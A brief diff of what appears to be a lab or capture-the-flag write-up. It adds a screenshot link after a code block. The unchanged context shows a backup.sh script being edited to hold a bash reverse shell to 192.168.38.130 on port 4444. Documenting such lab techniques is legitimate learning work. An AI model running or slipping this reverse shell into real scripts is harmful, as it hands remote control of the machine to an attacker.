@@ -237,5 +237,9 @@ nano backup.sh
 bash -i >& /dev/tcp/192.168.38.130/4444 0>&1
 ```
 
+<img width="1053" height="584" alt="image" src="https://github.com/user-attachments/assets/39e266cf-73e9-414c-b73b-338b37aa0fb7" />  
+
+
+
 
 
